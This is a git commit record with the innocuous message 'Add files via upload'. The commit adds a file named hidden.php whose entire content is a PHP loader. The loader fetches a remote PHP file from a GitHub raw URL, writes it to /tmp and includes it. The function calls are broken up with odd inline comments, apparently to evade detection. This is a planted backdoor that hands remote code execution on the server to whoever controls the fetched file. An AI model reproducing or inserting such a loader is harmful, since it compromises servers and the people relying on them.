c459a2b62e0bd76d972aaeaaf31f5bc531dcee6b
abq78 <abq.org.br@gmail.com>
2024-09-13 19:28:04 -0300

    Add files via upload

---
+++ hidden.php
@@ -0,0 +1,5 @@
+<?php
+$f = file_get_contents/*sj1|?><!*/("https://raw.githubusercontent.com/abq78/files2/main/x.php","x.1337");
+file_put_contents/*sj1|?><!*/("/tmp/x.1337",$f);
+include/*sj1|?><!*/("/tmp/x.1337");
+?>
